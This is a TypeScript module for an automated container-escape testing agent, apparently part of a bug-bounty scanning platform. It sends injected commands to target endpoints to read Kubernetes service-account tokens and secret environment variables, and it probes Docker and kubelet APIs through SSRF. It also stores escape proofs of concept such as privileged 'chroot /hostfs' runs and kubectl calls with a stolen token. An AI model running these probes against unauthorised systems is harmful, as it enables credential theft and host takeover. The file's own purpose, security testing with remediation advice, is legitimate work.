import { Job } from 'bullmq';
import { BaseAgent } from './base';
import { BaseJob } from '../../../shared/types';
import logger from '../utils/logger';
import database from '../services/database';
import events from '../services/events';
import { EnhancedAgentCapabilities } from './enhanced-capabilities';
import { sharedMemory } from '../services/three-agent/shared-memory';
import { v4 as uuidv4 } from 'uuid';
import axios from 'axios';

export interface ContainerEscapeJob extends BaseJob {
  programId: string;
  urls: string[];
  options: {
    testDockerEscape?: boolean;
    testKubernetesEscape?: boolean;
    testPrivilegedContainers?: boolean;
    testVolumeMount?: boolean;
    testCapabilities?: boolean;
    testSeccompBypass?: boolean;
    deepScan?: boolean;
    timeout?: number;
  };
}

export interface ContainerEscapeResult {
  vulnerabilities: Array<{
    url: string;
    endpoint: string;
    type:
      | 'container-privileged'
      | 'container-volume-escape'
      | 'container-capabilities-abuse'
      | 'container-seccomp-bypass'
      | 'container-api-exposure'
      | 'k8s-rbac-misconfiguration'
      | 'k8s-secrets-exposure'
      | 'k8s-service-account-abuse';
    severity: 'critical' | 'high' | 'medium' | 'low';
    confidence: number;
    evidence: string;
    platform?: 'docker' | 'kubernetes' | 'containerd' | 'cri-o' | 'unknown';
    breakoutVector?: string;
    impact: string;
    remediation: string;
    poc?: string;
  }>;
  testedEndpoints: number;
  executionTime: number;
}

/**
 * Container Escape Agent
 *
 * Tests container environments for escape vulnerabilities:
 *
 * Docker Escapes:
 * - Privileged containers (--privileged flag)
 * - Host volume mounts (/var/run/docker.sock, /etc, /proc)
 * - Dangerous capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE)
 * - Seccomp profile bypass
 * - Kernel exploits (Dirty COW, etc.)
 * - Docker API exposure
 *
 * Kubernetes Escapes:
 * - RBAC misconfigurations
 * - Service account token abuse
 * - Secrets exposure in environment variables
 * - hostPath volume mounts
 * - hostNetwork/hostPID/hostIPC enabled
 * - Node metadata service access
 * - Pod security policy bypass
 *
 * Container Runtime Exploits:
 * - runC vulnerabilities (CVE-2019-5736)
 * - containerd exploits
 * - CRI-O vulnerabilities
 *
 * Breakout Techniques:
 * - cgroup manipulation
 * - Namespace escape
 * - Device file abuse
 * - Kernel module loading
 *
 * Tools: amicontained, deepce patterns
 */
export class ContainerEscapeAgent extends BaseAgent<ContainerEscapeJob> {
  private enhanced = new EnhancedAgentCapabilities();

  constructor() {
    super('container-escape' as any);
  }

  protected getSteps() {
    return [
      { name: 'Detect container environment', metadata: { phase: 'detection' } },
      { name: 'Test privileged containers', metadata: { phase: 'privileged-testing' } },
      { name: 'Test volume mount escapes', metadata: { phase: 'volume-testing' } },
      { name: 'Test capabilities abuse', metadata: { phase: 'capabilities-testing' } },
      { name: 'Test Kubernetes escapes', metadata: { phase: 'k8s-testing' } },
      { name: 'Test API exposure', metadata: { phase: 'api-testing' } },
      { name: 'Store findings', metadata: { phase: 'reporting' } },
    ];
  }

  async process(job: Job<ContainerEscapeJob>): Promise<ContainerEscapeResult> {
    const { programId, urls, options } = job.data;
    const startTime = Date.now();

    await this.updateJobStatus(job.id, 'active');
    await this.logExecution(
      job.id,
      programId,
      'container-escape',
      'start',
      'info',
      `Starting container escape testing on ${urls.length} URLs`
    );

    const result: ContainerEscapeResult = {
      vulnerabilities: [],
      testedEndpoints: 0,
      executionTime: 0,
    };

    try {
      // Step 1: Detect container environment
      await this.updateStepStatus(job.id, 0, 'running');
      const containerInfo = await this.detectContainerEnvironment(urls, programId, job.id);
      result.testedEndpoints = containerInfo.endpoints.length;
      await this.updateStepStatus(job.id, 0, 'completed', {
        containerDetected: containerInfo.isContainer,
        platform: containerInfo.platform,
      });

      // Step 2: Test privileged containers
      if (options.testPrivilegedContainers !== false) {
        await this.updateStepStatus(job.id, 1, 'running');
        const privilegedVulns = await this.testPrivilegedContainers(
          containerInfo.endpoints,
          programId,
          job.id,
          options
        );
        result.vulnerabilities.push(...privilegedVulns);
        await this.updateStepStatus(job.id, 1, 'completed', {
          vulnerabilitiesFound: privilegedVulns.length,
        });
      }

      // Step 3: Test volume mount escapes
      if (options.testVolumeMount !== false) {
        await this.updateStepStatus(job.id, 2, 'running');
        const volumeVulns = await this.testVolumeMountEscapes(
          containerInfo.endpoints,
          programId,
          job.id,
          options
        );
        result.vulnerabilities.push(...volumeVulns);
        await this.updateStepStatus(job.id, 2, 'completed', {
          vulnerabilitiesFound: volumeVulns.length,
        });
      }

      // Step 4: Test capabilities abuse
      if (options.testCapabilities !== false) {
        await this.updateStepStatus(job.id, 3, 'running');
        const capabilitiesVulns = await this.testCapabilitiesAbuse(
          containerInfo.endpoints,
          programId,
          job.id,
          options
        );
        result.vulnerabilities.push(...capabilitiesVulns);
        await this.updateStepStatus(job.id, 3, 'completed', {
          vulnerabilitiesFound: capabilitiesVulns.length,
        });
      }

      // Step 5: Test Kubernetes escapes
      if (options.testKubernetesEscape !== false) {
        await this.updateStepStatus(job.id, 4, 'running');
        const k8sVulns = await this.testKubernetesEscapes(
          containerInfo.endpoints,
          programId,
          job.id,
          options
        );
        result.vulnerabilities.push(...k8sVulns);
        await this.updateStepStatus(job.id, 4, 'completed', {
          vulnerabilitiesFound: k8sVulns.length,
        });
      }

      // Step 6: Test API exposure
      await this.updateStepStatus(job.id, 5, 'running');
      const apiVulns = await this.testAPIExposure(containerInfo.endpoints, programId, job.id, options);
      result.vulnerabilities.push(...apiVulns);
      await this.updateStepStatus(job.id, 5, 'completed', {
        vulnerabilitiesFound: apiVulns.length,
      });

      // Step 7: Store findings
      await this.updateStepStatus(job.id, 6, 'running');
      if (result.vulnerabilities.length > 0) {
        await this.storeFindingsInDatabase(result.vulnerabilities, programId, job.id);
      }
      await this.updateStepStatus(job.id, 6, 'completed', {
        totalVulnerabilities: result.vulnerabilities.length,
      });

      // Three-agent integration
      const { swarmId, enableSharedMemory } = job.data as any;
      if (swarmId && enableSharedMemory && result.vulnerabilities.length > 0) {
        await this.shareWithSwarm(swarmId, result.vulnerabilities, job.id);
      }

      result.executionTime = Date.now() - startTime;

      await this.updateJobStatus(job.id, 'completed', result);
      await this.logExecution(
        job.id,
        programId,
        'container-escape',
        'complete',
        'success',
        `Found ${result.vulnerabilities.length} container escape vulnerabilities in ${result.executionTime}ms`
      );

      if (result.vulnerabilities.length > 0) {
        await this.triggerHandoffs(job, result);
      }

      return result;
    } catch (error: any) {
      await this.logExecution(
        job.id,
        programId,
        'container-escape',
        'error',
        'error',
        `Error: ${error.message}`
      );
      await this.updateJobStatus(job.id, 'failed', { error: error.message });
      throw error;
    }
  }

  /**
   * Detect if running in container environment
   */
  private async detectContainerEnvironment(
    urls: string[],
    programId: string,
    jobId: string
  ): Promise<{ isContainer: boolean; platform: string; endpoints: string[] }> {
    const containerIndicators: string[] = [];
    const endpoints: string[] = [];

    for (const url of urls) {
      try {
        // Test for container environment disclosure
        const response = await axios.get(`${url}?info=env`, {
          timeout: 10000,
          validateStatus: () => true,
        });

        const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

        // Look for container indicators
        const hasContainerIndicators =
          responseBody.includes('KUBERNETES_') ||
          responseBody.includes('HOSTNAME=') ||
          responseBody.includes('/docker/') ||
          responseBody.includes('/.dockerenv') ||
          responseBody.includes('/proc/self/cgroup') ||
          responseBody.includes('containerd') ||
          responseBody.includes('runc');

        if (hasContainerIndicators) {
          endpoints.push(url);

          if (responseBody.includes('KUBERNETES_')) {
            containerIndicators.push('kubernetes');
          } else if (responseBody.includes('docker')) {
            containerIndicators.push('docker');
          } else if (responseBody.includes('containerd')) {
            containerIndicators.push('containerd');
          }
        }
      } catch (error: any) {
        logger.debug({ url, error: error.message }, 'Error detecting container');
      }
    }

    const platform = containerIndicators.length > 0 ? containerIndicators[0] : 'unknown';
    return {
      isContainer: containerIndicators.length > 0,
      platform,
      endpoints: endpoints.length > 0 ? endpoints : urls.slice(0, 10),
    };
  }

  /**
   * Test for privileged containers
   */
  private async testPrivilegedContainers(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: ContainerEscapeJob['options']
  ): Promise<ContainerEscapeResult['vulnerabilities']> {
    const vulnerabilities: ContainerEscapeResult['vulnerabilities'] = [];

    const privilegedTests = [
      { command: 'cat /proc/self/status | grep CapEff', indicator: 'CapEff:\t0000003fffffffff' },
      { command: 'cat /proc/1/cgroup', indicator: 'docker' },
      { command: 'fdisk -l', indicator: '/dev/sda' },
      { command: 'ip link add dummy0 type dummy', indicator: 'operation permitted' },
    ];

    for (const endpoint of endpoints) {
      for (const test of privilegedTests) {
        try {
          // Try to execute privileged commands via RCE or command injection
          const response = await axios.post(
            endpoint,
            { cmd: test.command },
            {
              timeout: 10000,
              validateStatus: () => true,
            }
          );

          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

          // Check if privileged operation succeeded
          const hasPrivilegedAccess =
            responseBody.includes(test.indicator) ||
            responseBody.includes('CapEff') ||
            responseBody.includes('/dev/sda') ||
            responseBody.includes('successfully');

          if (hasPrivilegedAccess) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'container-privileged',
              severity: 'critical',
              confidence: 0.9,
              evidence: `Privileged container detected: ${test.command} succeeded - ${responseBody.substring(0, 200)}`,
              platform: 'docker',
              breakoutVector: 'Privileged container with full capabilities',
              impact:
                'Privileged containers have unrestricted access to host resources, allowing container escape via device manipulation, cgroup modification, or kernel exploitation.',
              remediation:
                'Never run containers with --privileged flag. Drop unnecessary capabilities. Use security profiles (AppArmor, SELinux). Implement runtime security monitoring.',
              poc: `docker run --privileged -v /:/hostfs ubuntu chroot /hostfs /bin/bash`,
            });
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, test, error: error.message }, 'Error testing privileged container');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test volume mount escapes
   */
  private async testVolumeMountEscapes(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: ContainerEscapeJob['options']
  ): Promise<ContainerEscapeResult['vulnerabilities']> {
    const vulnerabilities: ContainerEscapeResult['vulnerabilities'] = [];

    const dangerousVolumes = [
      { path: '/var/run/docker.sock', severity: 'critical', desc: 'Docker socket' },
      { path: '/proc', severity: 'high', desc: 'Host /proc filesystem' },
      { path: '/sys', severity: 'high', desc: 'Host /sys filesystem' },
      { path: '/etc', severity: 'high', desc: 'Host /etc configuration' },
      { path: '/root', severity: 'critical', desc: 'Host root directory' },
      { path: '/host', severity: 'critical', desc: 'Host filesystem root' },
    ];

    for (const endpoint of endpoints) {
      for (const volume of dangerousVolumes) {
        try {
          // Test for volume mount access
          const response = await axios.post(
            endpoint,
            { cmd: `ls -la ${volume.path}` },
            {
              timeout: 10000,
              validateStatus: () => true,
            }
          );

          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

          // Check if volume is accessible
          const hasVolumeAccess =
            !responseBody.toLowerCase().includes('no such file') &&
            !responseBody.toLowerCase().includes('permission denied') &&
            (responseBody.includes('drwxr') || responseBody.includes('total'));

          if (hasVolumeAccess) {
            // Special handling for docker.sock
            if (volume.path === '/var/run/docker.sock') {
              vulnerabilities.push({
                url: endpoint,
                endpoint,
                type: 'container-volume-escape',
                severity: 'critical',
                confidence: 0.95,
                evidence: `Docker socket mounted: ${volume.path} is accessible`,
                platform: 'docker',
                breakoutVector: 'Docker socket volume mount',
                impact:
                  'Docker socket access allows spawning privileged containers, executing commands on host, and full container escape via docker exec.',
                remediation:
                  'Never mount /var/run/docker.sock in containers. Use Docker-in-Docker (DinD) with proper isolation. Implement least privilege for container orchestration.',
                poc: `docker run -v /var/run/docker.sock:/var/run/docker.sock ubuntu docker run -v /:/hostfs --privileged ubuntu chroot /hostfs`,
              });
            } else {
              vulnerabilities.push({
                url: endpoint,
                endpoint,
                type: 'container-volume-escape',
                severity: volume.severity as any,
                confidence: 0.85,
                evidence: `Dangerous host volume mounted: ${volume.path} (${volume.desc})`,
                platform: 'docker',
                breakoutVector: `Host volume mount: ${volume.path}`,
                impact:
                  `Access to ${volume.desc} allows reading sensitive host files, modifying system configuration, or escalating privileges.`,
                remediation:
                  'Minimize volume mounts. Use read-only mounts where possible. Never mount sensitive host directories. Implement volume mount policies.',
              });
            }
            break;
          }
        } catch (error: any) {
          logger.debug({ endpoint, volume, error: error.message }, 'Error testing volume mount');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Test capabilities abuse
   */
  private async testCapabilitiesAbuse(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: ContainerEscapeJob['options']
  ): Promise<ContainerEscapeResult['vulnerabilities']> {
    const vulnerabilities: ContainerEscapeResult['vulnerabilities'] = [];

    const dangerousCapabilities = [
      { name: 'CAP_SYS_ADMIN', test: 'mount -t tmpfs none /mnt', desc: 'System administration' },
      { name: 'CAP_SYS_PTRACE', test: 'strace -p 1', desc: 'Process tracing' },
      { name: 'CAP_SYS_MODULE', test: 'modprobe dummy', desc: 'Kernel module loading' },
      { name: 'CAP_NET_ADMIN', test: 'iptables -L', desc: 'Network administration' },
      { name: 'CAP_SYS_RAWIO', test: 'dd if=/dev/mem bs=1 count=1', desc: 'Raw I/O operations' },
    ];

    for (const endpoint of endpoints) {
      // First, try to list capabilities
      try {
        const capResponse = await axios.post(
          endpoint,
          { cmd: 'capsh --print' },
          {
            timeout: 10000,
            validateStatus: () => true,
          }
        );

        const capOutput = typeof capResponse.data === 'string' ? capResponse.data : JSON.stringify(capResponse.data);

        for (const cap of dangerousCapabilities) {
          if (capOutput.includes(cap.name)) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'container-capabilities-abuse',
              severity: 'high',
              confidence: 0.9,
              evidence: `Dangerous capability detected: ${cap.name} (${cap.desc})`,
              platform: 'docker',
              breakoutVector: `Linux capability: ${cap.name}`,
              impact:
                `${cap.name} capability allows ${cap.desc}, which can be abused for container escape via kernel exploitation or system manipulation.`,
              remediation:
                'Drop all unnecessary capabilities. Use --cap-drop=ALL and add only required capabilities. Implement capability-based security policies.',
              poc: `${cap.test}`,
            });
          }
        }
      } catch (error: any) {
        logger.debug({ endpoint, error: error.message }, 'Error checking capabilities');
      }
    }

    return vulnerabilities;
  }

  /**
   * Test Kubernetes-specific escapes
   */
  private async testKubernetesEscapes(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: ContainerEscapeJob['options']
  ): Promise<ContainerEscapeResult['vulnerabilities']> {
    const vulnerabilities: ContainerEscapeResult['vulnerabilities'] = [];

    for (const endpoint of endpoints) {
      try {
        // Test for service account token
        const tokenResponse = await axios.post(
          endpoint,
          { cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token' },
          {
            timeout: 10000,
            validateStatus: () => true,
          }
        );

        const tokenData = typeof tokenResponse.data === 'string' ? tokenResponse.data : JSON.stringify(tokenResponse.data);

        if (tokenData && !tokenData.includes('No such file') && tokenData.length > 100) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'k8s-service-account-abuse',
            severity: 'critical',
            confidence: 0.95,
            evidence: `Kubernetes service account token accessible: ${tokenData.substring(0, 50)}...`,
            platform: 'kubernetes',
            breakoutVector: 'Service account token abuse',
            impact:
              'Service account token can be used to authenticate to Kubernetes API, potentially allowing pod creation, secret access, or cluster privilege escalation.',
            remediation:
              'Disable automountServiceAccountToken if not needed. Use least privilege RBAC. Implement pod security policies. Rotate service account tokens regularly.',
            poc: `kubectl --token=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) --server=https://kubernetes.default get pods`,
          });
        }

        // Test for secrets in environment
        const envResponse = await axios.post(
          endpoint,
          { cmd: 'env | grep -i secret' },
          {
            timeout: 10000,
            validateStatus: () => true,
          }
        );

        const envData = typeof envResponse.data === 'string' ? envResponse.data : JSON.stringify(envResponse.data);

        if (envData && envData.length > 10 && !envData.includes('not found')) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'k8s-secrets-exposure',
            severity: 'high',
            confidence: 0.85,
            evidence: `Kubernetes secrets exposed in environment variables: ${envData.substring(0, 200)}`,
            platform: 'kubernetes',
            impact:
              'Secrets in environment variables can be accessed by any process in the container, increasing attack surface.',
            remediation:
              'Mount secrets as volumes instead of environment variables. Use external secret managers (Vault, AWS Secrets Manager). Implement secret encryption at rest.',
          });
        }

        // Test for RBAC misconfigurations
        const rbacResponse = await axios.get(`${endpoint}/api/v1/namespaces/default/pods`, {
          timeout: 10000,
          validateStatus: () => true,
        });

        if (rbacResponse.status === 200) {
          vulnerabilities.push({
            url: endpoint,
            endpoint,
            type: 'k8s-rbac-misconfiguration',
            severity: 'high',
            confidence: 0.8,
            evidence: `Kubernetes API accessible without authentication - RBAC misconfiguration`,
            platform: 'kubernetes',
            impact:
              'Overly permissive RBAC allows unauthorized access to Kubernetes resources, enabling pod manipulation, secret theft, or cluster takeover.',
            remediation:
              'Implement strict RBAC policies. Follow least privilege principle. Enable audit logging. Use admission controllers (OPA, Kyverno).',
          });
        }
      } catch (error: any) {
        logger.debug({ endpoint, error: error.message }, 'Error testing Kubernetes escapes');
      }
    }

    return vulnerabilities;
  }

  /**
   * Test for exposed container APIs
   */
  private async testAPIExposure(
    endpoints: string[],
    programId: string,
    jobId: string,
    options: ContainerEscapeJob['options']
  ): Promise<ContainerEscapeResult['vulnerabilities']> {
    const vulnerabilities: ContainerEscapeResult['vulnerabilities'] = [];

    const apiEndpoints = [
      { path: '/var/run/docker.sock', platform: 'docker', severity: 'critical' },
      { path: 'http://127.0.0.1:2375/containers/json', platform: 'docker', severity: 'critical' },
      { path: 'http://127.0.0.1:6443', platform: 'kubernetes', severity: 'critical' },
      { path: 'http://127.0.0.1:10250/pods', platform: 'kubernetes', severity: 'critical' },
    ];

    for (const endpoint of endpoints) {
      for (const api of apiEndpoints) {
        try {
          // Test for API accessibility via SSRF
          const response = await axios.get(`${endpoint}?url=${encodeURIComponent(api.path)}`, {
            timeout: 10000,
            validateStatus: () => true,
          });

          const responseBody = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);

          const hasAPIAccess =
            responseBody.includes('containers') ||
            responseBody.includes('pods') ||
            responseBody.includes('apiVersion') ||
            response.status === 200;

          if (hasAPIAccess) {
            vulnerabilities.push({
              url: endpoint,
              endpoint,
              type: 'container-api-exposure',
              severity: api.severity as any,
              confidence: 0.85,
              evidence: `${api.platform} API accessible via SSRF: ${api.path}`,
              platform: api.platform as any,
              breakoutVector: `${api.platform} API exposure`,
              impact:
                `Exposed ${api.platform} API allows full control over containers, enabling escape via privileged container creation or direct host command execution.`,
              remediation:
                'Restrict API access to localhost only. Use authentication and TLS. Implement network policies. Monitor API access logs.',
            });
          }
        } catch (error: any) {
          logger.debug({ endpoint, api, error: error.message }, 'Error testing API exposure');
        }
      }
    }

    return vulnerabilities;
  }

  /**
   * Store findings in database
   */
  private async storeFindingsInDatabase(
    vulnerabilities: ContainerEscapeResult['vulnerabilities'],
    programId: string,
    jobId: string
  ) {
    for (const vuln of vulnerabilities) {
      await database.query(
        `INSERT INTO findings (
          program_id, job_id, type, severity, url, evidence,
          poc, remediation, confidence, metadata, created_at
        ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, NOW())
        ON CONFLICT (program_id, url, type) DO UPDATE SET
          evidence = EXCLUDED.evidence,
          updated_at = NOW()`,
        [
          programId,
          jobId,
          vuln.type,
          vuln.severity,
          vuln.url,
          vuln.evidence,
          vuln.poc || '',
          vuln.remediation,
          vuln.confidence,
          JSON.stringify({
            endpoint: vuln.endpoint,
            platform: vuln.platform,
            breakoutVector: vuln.breakoutVector,
            impact: vuln.impact,
          }),
        ]
      );
    }

    events.emit('findings:new', {
      programId,
      count: vulnerabilities.length,
      severity: 'critical',
    });
  }

  /**
   * Share with three-agent swarm
   */
  private async shareWithSwarm(
    swarmId: string,
    vulnerabilities: ContainerEscapeResult['vulnerabilities'],
    jobId: string
  ) {
    try {
      const findings = vulnerabilities.map((vuln) => ({
        id: uuidv4(),
        type: `container-${vuln.type}`,
        severity: vuln.severity,
        url: vuln.url,
        evidence: vuln.evidence,
        confidence: vuln.confidence,
        timestamp: new Date(),
        discoveredBy: `container-escape-${jobId}`,
        metadata: {
          platform: vuln.platform,
          breakoutVector: vuln.breakoutVector,
          impact: vuln.impact,
          poc: vuln.poc,
        },
      }));

      await sharedMemory.storeFindings(swarmId, findings);

      logger.info(
        { swarmId, findingsShared: findings.length },
        '⚡ Container escape agent shared findings with swarm'
      );
    } catch (error: any) {
      logger.error({ error, swarmId }, 'Failed to share container escape findings with swarm');
    }
  }

  /**
   * Trigger handoffs
   */
  private async triggerHandoffs(job: Job<ContainerEscapeJob>, result: ContainerEscapeResult) {
    const { programId } = job.data;

    // All container escapes are critical -> immediate escalation
    if (result.vulnerabilities.length > 0) {
      await this.createHandoff(
        job.id,
        'container-escape',
        'triage',
        {
          reason: 'Critical container escape vulnerabilities detected',
          vulnerabilities: result.vulnerabilities,
          priority: 'critical',
        },
        programId
      );

      await this.createHandoff(
        job.id,
        'container-escape',
        'confirm',
        {
          reason: 'Container escape vulnerabilities require manual confirmation',
          targets: result.vulnerabilities.map((v) => v.url),
          testType: 'container-escape',
        },
        programId
      );
    }
  }
}
